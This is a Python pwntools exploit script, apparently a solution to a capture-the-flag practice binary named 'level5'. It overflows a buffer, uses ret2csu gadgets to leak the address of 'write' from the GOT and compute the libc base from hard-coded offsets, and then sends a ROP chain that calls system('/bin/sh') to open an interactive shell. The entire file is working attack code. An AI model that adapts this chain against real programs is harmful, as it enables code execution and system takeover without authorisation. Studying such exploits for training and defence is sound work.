from pwn import *
context(arch = 'amd64', os = 'linux')
p=process("./level5")
elf = ELF('./level5')
libc = ELF('./libc.so.6')

def lg(buf):
    log.success(f'\033[33m{buf}:{eval(buf):#x}\033[0m')

padding = b"a"*0x88
write_addr = elf.got['write']
read_addr = elf.got['read']
write = elf.plt['write']
main_addr = elf.symbols['main']
bss = 0x601030
csu1 = 0x40061A
csu2 = 0x400600

'''gdb.attach(p)
pause()'''

def csu(rbx, rbp, r12, r13, r14, r15, last):
    payload = b'a' * 0x88
    payload += p64(csu1) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)
    payload += p64(csu2)
    payload += b'a' * 0x38
    payload += p64(last)
    p.send(payload)
    sleep(1)

main_addr=0x400566
p.recvuntil('Hello, World\n')
csu(0, 1, write_addr, 8, write_addr, 1, main_addr)
write_start = u64(p.recv(8))
lg('write_start')

base = write_start - 0x104200
lg('base')

system_addr = base + 0x528f0 + 27 #栈平衡，+27直接执行do_system
binsh=base + 0x1a7e43

pop_rdi = 0x400623

payload = padding + p64(pop_rdi) + p64(binsh) + p64(system_addr)
p.send(payload)

p.interactive()
